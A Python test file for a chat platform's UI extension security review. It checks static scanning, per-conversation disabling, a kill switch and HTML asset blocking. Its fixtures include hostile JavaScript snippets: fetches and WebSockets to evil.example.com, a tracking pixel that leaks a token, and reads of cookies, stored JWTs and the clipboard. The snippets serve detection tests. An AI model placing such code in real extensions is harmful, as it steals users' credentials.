"""Tests for PFP UI extension security hardening (phase 4).

Covers:
  - browser-side JS static review patterns flag known exfiltration shapes
  - the per-conversation toggle drops a disabled package from the boot
    manifest, the asset task, and the action dispatcher
  - the global env kill switch (PAWFLOW_UI_EXTENSIONS_DISABLED) wins over
    every other check
  - `_static_text_review` picks the JS pattern set for .js/.css/.html
    files and falls back to the python set otherwise
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from core import FlowFile, pfp_package
from core.package_review import (
    _JS_STATIC_PATTERNS, _STATIC_PATTERNS, _static_text_review,
)
from core.tool_mcp_filters import (
    _ui_extensions_globally_disabled, filter_enabled_extensions,
    is_extension_enabled, set_filters,
)


# ── JS static patterns ─────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("snippet,expected_category", [
    ("var t = getToken();", "token_exfiltration"),
    ("const x = localStorage.getItem('pawflow_jwt');", "token_exfiltration"),
    ("return document.cookie;", "token_exfiltration"),
    ("fetch('https://evil.example.com/x')", "external_network"),
    ("new XMLHttpRequest()", "external_network"),
    ("new WebSocket('wss://evil.example.com')", "external_network"),
    ("navigator.sendBeacon('/x', d)", "external_network"),
    ("eval('alert(1)')", "dynamic_execution"),
    ("new Function('return 1')()", "dynamic_execution"),
    ("setTimeout('console.log(1)', 100)", "dynamic_execution"),
    ("window.location = 'https://evil.example.com'", "navigation_hijack"),
    ("window.open('https://x')", "navigation_hijack"),
    ("el.innerHTML = userInput;", "dom_injection"),
    ("document.write('<x>')", "dom_injection"),
    ("new Image().src = 'https://x?token=' + t", "pixel_exfiltration"),
    ("navigator.clipboard.readText().then(console.log)", "clipboard_access"),
])
def test_js_static_patterns_flag_known_exfiltration_shapes(snippet, expected_category):
    out = _static_text_review([("ext.js", snippet)])
    cats = {f.get("category") for f in out["findings"]}
    assert expected_category in cats, f"Missing {expected_category!r} in {cats!r}"


def test_js_patterns_are_used_for_js_assets_only():
    """`_static_text_review` must pick the JS set for .js sources."""
    py = _static_text_review([("handler.py", "subprocess.Popen(['ls'])")])
    assert any(f["category"] == "process_execution" for f in py["findings"])
    js = _static_text_review([("ext.js", "subprocess.Popen(['ls'])")])
    # subprocess pattern is python-only; JS-side has its own surface.
    assert not any(f["category"] == "process_execution" for f in js["findings"])


def test_js_pattern_set_is_disjoint_from_python_set():
    js_cats = {entry[1] for entry in _JS_STATIC_PATTERNS}
    py_cats = {entry[1] for entry in _STATIC_PATTERNS}
    # `dynamic_execution` and `prompt_injection`/`secret_exfiltration` shapes
    # have python-flavored regexes; the JS set has its own `dynamic_execution`
    # pattern. The overlap is intentional and they live in different rule sets.
    assert "token_exfiltration" in js_cats
    assert "external_network" in js_cats
    assert "secret_exfiltration" in py_cats
    assert "process_execution" in py_cats
    assert "process_execution" not in js_cats


def test_clean_js_does_not_trigger_any_pattern():
    clean = (
        "pawflow.register('x', function (pfp) {\n"
        "  pfp.ui.slot('action_menu', 'x.open', () => {\n"
        "    const el = document.createElement('div');\n"
        "    el.textContent = 'hello';\n"
        "    return el;\n"
        "  });\n"
        "});\n"
    )
    out = _static_text_review([("ext.js", clean)])
    assert out["risk"] == "low"
    assert out["findings"] == []


# ── Per-conversation toggle ────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _mock_llm_review(monkeypatch):
    """Stub the summarizer review so install plans do not hit a real LLM."""
    import core.package_review as package_review

    class _ReviewLLM:
        def complete(self, **kwargs):
            class _Response:
                content = json.dumps({
                    "risk": "low", "allowed": True,
                    "requires_human_review": False, "findings": [],
                    "sanitized_summary": "ok", "recommended_changes": [],
                })
            return _Response()
    monkeypatch.setattr(
        package_review, "_resolve_review_llm",
        lambda user_id, conversation_id: (_ReviewLLM(), None, "review_llm"))


def _create_conv(store, user_id: str = "alice") -> str:
    cid = store.generate_id()
    store.save(cid, [], user_id=user_id)
    return cid


def test_is_extension_enabled_default_is_true(tmp_path, monkeypatch):
    monkeypatch.setattr("core.paths.RUNTIME_DIR", tmp_path / "runtime")
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    assert is_extension_enabled(cid, "some.pkg") is True


def test_is_extension_enabled_respects_disabled_list(tmp_path, monkeypatch):
    monkeypatch.setattr("core.paths.RUNTIME_DIR", tmp_path / "runtime")
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    set_filters(cid, {"disabled_extensions": ["shady.pkg"]})
    assert is_extension_enabled(cid, "shady.pkg") is False
    assert is_extension_enabled(cid, "trusted.pkg") is True


def test_filter_enabled_extensions(tmp_path, monkeypatch):
    monkeypatch.setattr("core.paths.RUNTIME_DIR", tmp_path / "runtime")
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    set_filters(cid, {"disabled_extensions": ["shady.pkg"]})
    kept = filter_enabled_extensions(cid, ["shady.pkg", "trusted.pkg", ""])
    assert kept == ["trusted.pkg"]


# ── Global env kill switch ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("value,expected", [
    ("1", True), ("true", True), ("TRUE", True), ("yes", True), ("on", True),
    ("0", False), ("", False), ("false", False), ("no", False),
])
def test_kill_switch_env_parsing(monkeypatch, value, expected):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", value)
    assert _ui_extensions_globally_disabled() is expected


def test_kill_switch_short_circuits_is_extension_enabled(monkeypatch):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", "1")
    assert is_extension_enabled("any-conv", "any.pkg") is False


def test_kill_switch_short_circuits_filter_enabled(monkeypatch):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", "true")
    assert filter_enabled_extensions("any-conv", ["a", "b"]) == []


# ── Boot manifest filters ────────────────────────────────────────────────────────────────
def _write_min_ui_pkg(root: Path, keypair):
    pkg = root / "ui.pfpdir"
    (pkg / "content" / "ui").mkdir(parents=True)
    (pkg / "content" / "ui" / "extension.js").write_text(
        "pawflow.register('x.pkg', function (pfp) {});\n",
        encoding="utf-8")
    manifest = {
        "format": "pawflow.package.v1",
        "package": "x.pkg",
        "version": "0.1.0",
        "developer": {"email": "dev@example.com",
                       "public_key": keypair["public_key"]},
        "objects": [{
            "id": "ui_extension:main",
            "type": "ui_extension",
            "name": "main",
            "version_compat": "ui.v1",
            "assets": {"scripts": ["content/ui/extension.js"]},
            "slots": [{"slot": "action_menu", "id": "x.open"}],
            "hooks": ["boot"],
        }],
    }
    (pkg / "pfp.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return pkg


@pytest.fixture
def installed_ui_pkg(tmp_path, monkeypatch):
    monkeypatch.setattr("core.paths.REPOSITORY_DIR", tmp_path / "repo")
    monkeypatch.setattr("core.paths.RUNTIME_DIR", tmp_path / "runtime")
    keypair = pfp_package.create_signing_key()
    pkgdir = _write_min_ui_pkg(tmp_path, keypair)
    built = pfp_package.build_pfp(str(pkgdir), private_key=keypair["private_key"])
    pfp_package.install_pfp(
        built["path"], user_id="alice", include=["ui_extension:main"])
    return "x.pkg"


def test_boot_manifest_includes_enabled_extension(installed_ui_pkg, tmp_path):
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    from tasks.io.serve_chat_ui import _initial_extensions_block
    out = _initial_extensions_block(user_id="alice", conversation_id=cid)
    assert installed_ui_pkg in out


def test_boot_manifest_drops_disabled_extension(installed_ui_pkg, tmp_path):
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    set_filters(cid, {"disabled_extensions": [installed_ui_pkg]})
    from tasks.io.serve_chat_ui import _initial_extensions_block
    out = _initial_extensions_block(user_id="alice", conversation_id=cid)
    assert installed_ui_pkg not in out
    assert "window.PAWFLOW_EXTENSIONS=[]" in out


def test_boot_manifest_empty_when_kill_switch_set(installed_ui_pkg, monkeypatch):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", "1")
    from tasks.io.serve_chat_ui import _initial_extensions_block
    out = _initial_extensions_block(user_id="alice", conversation_id="")
    assert "window.PAWFLOW_EXTENSIONS=[]" in out


# ── Asset task respects toggle + kill switch ──────────────────────────────────────────────────

def _asset_url_for(installed_pkg_id: str) -> str:
    rec = pfp_package.list_installed_ui_extensions(
        user_id="alice", scope="user")[0]
    asset = rec["assets"][0]
    short = asset["sha256"].replace("sha256:", "")[:16]
    return f"/chat/ext/{installed_pkg_id}/{short}/{asset['path']}"


def _asset_task_call(http_path: str, principal: str = "alice",
                     conv_cookie: str = ""):
    from tasks.io.serve_pfp_ext_assets import ServePfpExtensionAssetsTask
    task = ServePfpExtensionAssetsTask({})
    ff = FlowFile(content=b"")
    ff.set_attribute("http.path", http_path)
    if principal:
        ff.set_attribute("http.auth.principal", principal)
    if conv_cookie:
        ff.set_attribute("http.cookie.pawflow_conv", conv_cookie)
    return task.execute(ff)[0]


def test_asset_task_404_when_kill_switch_set(installed_ui_pkg, monkeypatch):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", "1")
    out = _asset_task_call(_asset_url_for(installed_ui_pkg))
    assert out.get_attribute("http.response.status") == "404"


def test_asset_task_404_when_extension_disabled_in_conv(installed_ui_pkg, tmp_path):
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    set_filters(cid, {"disabled_extensions": [installed_ui_pkg]})
    out = _asset_task_call(_asset_url_for(installed_ui_pkg), conv_cookie=cid)
    assert out.get_attribute("http.response.status") == "404"


def test_asset_task_200_when_extension_enabled_in_conv(installed_ui_pkg, tmp_path):
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    # No disabled_extensions list — default is enabled.
    out = _asset_task_call(_asset_url_for(installed_ui_pkg), conv_cookie=cid)
    assert out.get_attribute("http.response.status") == "200"


# ── Action dispatcher respects toggle + kill switch ─────────────────────────────────────────────────

def _dispatch(body: dict) -> FlowFile:
    from tasks.ai.actions.pfp_ui import _handle_pfp_ui
    ff = FlowFile(content=json.dumps(body).encode("utf-8"))
    ff.set_attribute("http.auth.principal", "alice")
    out = _handle_pfp_ui(None, body["action"], body, None, "alice", ff)
    return out[0] if out else None


def test_dispatcher_503_when_kill_switch_set(installed_ui_pkg, monkeypatch):
    monkeypatch.setenv("PAWFLOW_UI_EXTENSIONS_DISABLED", "1")
    out = _dispatch({"action": "x.foo", "_ext": installed_ui_pkg})
    assert out.get_attribute("http.response.status") == "503"


def test_dispatcher_403_when_extension_disabled_in_conv(installed_ui_pkg, tmp_path):
    from core.conversation_store import ConversationStore
    ConversationStore.reset()
    store = ConversationStore.instance()
    cid = _create_conv(store)
    set_filters(cid, {"disabled_extensions": [installed_ui_pkg]})
    out = _dispatch({
        "action": "x.foo", "_ext": installed_ui_pkg, "conversation_id": cid,
    })
    assert out.get_attribute("http.response.status") == "403"


# ── .html / .css review coverage (qwen findings #3 + #4) ───────────────────────────────────────────────────────────

def test_review_files_now_includes_css_in_payload():
    """Phase 4 docs claim CSS assets are reviewed; check the selector actually emits them."""
    from core.package_review import _review_files
    files = {
        "content/ui/extension.js": b"pawflow.register('x', function(){});",
        "content/ui/extension.css": b".x{color:red}",
        "content/ui/extension.html": b"<p>hi</p>",
    }
    selected, _ = _review_files(files, "")
    paths = {row["path"] for row in selected}
    assert "content/ui/extension.css" in paths
    assert "content/ui/extension.html" in paths
    assert "content/ui/extension.js" in paths


def test_html_assets_rejected_at_install_plan(tmp_path):
    """A .pfp that declares a .html asset is refused by the manifest validator."""
    keypair = pfp_package.create_signing_key()
    pkg = tmp_path / "bad.pfpdir"
    (pkg / "content" / "ui").mkdir(parents=True)
    (pkg / "content" / "ui" / "extension.js").write_text(
        "pawflow.register('bad.html', function(){});", encoding="utf-8")
    (pkg / "content" / "ui" / "page.html").write_text(
        "<script>alert(1)</script>", encoding="utf-8")
    manifest = {
        "format": "pawflow.package.v1",
        "package": "bad.html",
        "version": "0.1.0",
        "developer": {"email": "d@x", "public_key": keypair["public_key"]},
        "objects": [{
            "id": "ui_extension:main", "type": "ui_extension", "name": "main",
            "version_compat": "ui.v1",
            "assets": {
                "scripts": ["content/ui/extension.js",
                            "content/ui/page.html"],
            },
            "slots": [{"slot": "action_menu", "id": "bad.x"}],
            "hooks": ["boot"],
        }],
    }
    (pkg / "pfp.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    built = pfp_package.build_pfp(str(pkg), private_key=keypair["private_key"])
    plan = pfp_package.inspect_pfp(built["path"], user_id="alice")
    row = next(r for r in plan["objects"] if r["type"] == "ui_extension")
    assert row["status"] == "blocked"
    assert ".html" in row["reason"] or "not allowed" in row["reason"]


def test_asset_task_refuses_html_extension(tmp_path, monkeypatch):
    """Server-side allowlist also refuses .html, redundant with the install check."""
    monkeypatch.setattr("core.paths.REPOSITORY_DIR", tmp_path / "repo")
    out = _asset_task_call("/chat/ext/x/abc1234567890abc/page.html")
    assert out.get_attribute("http.response.status") == "404"


# ── Handler secrets propagation (qwen finding #2) ──────────────────────────────────────────────────────────

def _write_pkg_with_handler_secret(root, keypair, *, required: bool = True):
    pkg = root / "secret.pfpdir"
    (pkg / "content" / "ui").mkdir(parents=True)
    (pkg / "content" / "handlers").mkdir(parents=True)
    (pkg / "content" / "ui" / "extension.js").write_text(
        "pawflow.register('sec.pkg', function(){});", encoding="utf-8")
    (pkg / "content" / "handlers" / "call.py").write_text(
        "from pawflow import pfp\npfp.result({})\n", encoding="utf-8")
    manifest = {
        "format": "pawflow.package.v1",
        "package": "sec.pkg",
        "version": "0.1.0",
        "developer": {"email": "d@x", "public_key": keypair["public_key"]},
        "objects": [{
            "id": "ui_extension:main", "type": "ui_extension", "name": "main",
            "version_compat": "ui.v1",
            "assets": {"scripts": ["content/ui/extension.js"]},
            "slots": [{"slot": "action_menu", "id": "sec.x"}],
            "hooks": ["boot"],
            "handlers": [{
                "action": "sec.call",
                "path": "content/handlers/call.py",
                "runner": "python",
                "secrets": [{
                    "name": "api_key",
                    "env": "PROVIDER_API_KEY",
                    "required": required,
                }],
            }],
        }],
    }
    (pkg / "pfp.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return pkg


def test_install_plan_surfaces_handler_required_secret(tmp_path):
    """Handler-level required secrets must appear in the install plan's row.secrets."""
    keypair = pfp_package.create_signing_key()
    pkgdir = _write_pkg_with_handler_secret(tmp_path, keypair)
    built = pfp_package.build_pfp(str(pkgdir), private_key=keypair["private_key"])
    plan = pfp_package.inspect_pfp(built["path"], user_id="alice")
    row = next(r for r in plan["objects"] if r["type"] == "ui_extension")
    secret_names = {s["name"] for s in row["secrets"]}
    assert "api_key" in secret_names, (
        f"handler-level secret not surfaced in install plan: {row['secrets']}")


def test_install_refuses_when_handler_required_secret_unbound(tmp_path, monkeypatch):
    """Install must reject when the user did not bind a required handler secret."""
    monkeypatch.setattr("core.paths.REPOSITORY_DIR", tmp_path / "repo")
    keypair = pfp_package.create_signing_key()
    pkgdir = _write_pkg_with_handler_secret(tmp_path, keypair)
    built = pfp_package.build_pfp(str(pkgdir), private_key=keypair["private_key"])
    result = pfp_package.install_pfp(
        built["path"], user_id="alice",
        include=["ui_extension:main"])
    # No --secret api_key=... was provided. Expect skipped, not installed.
    skipped = result.get("skipped") or []
    reasons = {s["reason"] for s in skipped}
    assert "missing_secret_binding" in reasons, result


def test_handler_secret_bindings_propagate_to_runtime(tmp_path, monkeypatch):
    """After install with --secret, resolve_ui_handler must carry the binding."""
    monkeypatch.setattr("core.paths.REPOSITORY_DIR", tmp_path / "repo")
    keypair = pfp_package.create_signing_key()
    pkgdir = _write_pkg_with_handler_secret(tmp_path, keypair)
    built = pfp_package.build_pfp(str(pkgdir), private_key=keypair["private_key"])
    # Pretend the secret exists in the user's secret store — the install
    # plan only checks the binding is bound to a key, not that the key
    # itself exists in this test environment.
    from core.pfp_package import _pp_mod2 as _pp_secret_mod
    monkeypatch.setattr(
        _pp_secret_mod, "_secret_key_exists",
        lambda secret_key, user_id, conversation_id: True)
    result = pfp_package.install_pfp(
        built["path"], user_id="alice",
        include=["ui_extension:main"],
        secret_bindings={"api_key": "stored_provider_key"})
    assert result["ok"], result
    resolved = pfp_package.resolve_ui_handler(
        "sec.pkg", "sec.call", user_id="alice", scope="user")
    assert resolved is not None
    bindings = resolved["package_runtime"]["secret_bindings"]
    assert bindings == {"api_key": "stored_provider_key"}, (
        f"handler bindings missing or wrong: {bindings!r}")


# ── Same-origin reality: documented limitation (qwen finding #1) ────────────────────────────────────────────────────

def test_ui_handler_dispatcher_trusts_client_supplied_ext(installed_ui_pkg, monkeypatch):
    """Document that `_ext` in the request body is self-declared.

    This is not a security control: two extensions sharing the same
    origin in the user's browser tab can both invoke handlers under any
    installed package id. The audit log records the `_ext` value so a
    human reviewer can spot abuse. See the dispatcher docstring for the
    full trust model.
    """
    from core import pfp_runtime
    seen = {}

    def _fake_bridge(request):
        seen["request"] = request
        return {
            "format": pfp_runtime.RUNTIME_RESULT_FORMAT,
            "ok": True,
            "result": {"called": True},
        }
    monkeypatch.setattr(pfp_runtime, "_invoke_bridge", _fake_bridge)

    # An attacker page calls `/api/ui` with `_ext` set to the installed
    # package id. The dispatcher resolves and runs the handler. There is
    # no per-extension binding to verify the caller — same-origin reality.
    from tasks.ai.actions.pfp_ui import _handle_pfp_ui
    body = {"action": "x.foo", "_ext": installed_ui_pkg}
    ff = FlowFile(content=json.dumps(body).encode("utf-8"))
    ff.set_attribute("http.auth.principal", "alice")
    out = _handle_pfp_ui(None, body["action"], body, None, "alice", ff)
    # 404 because the installed_ui_pkg has no `x.foo` handler, not
    # because the call was rejected. The point is the dispatcher took
    # the `_ext` at face value and tried to resolve.
    assert out is not None
    assert out[0].get_attribute("http.response.status") == "404"
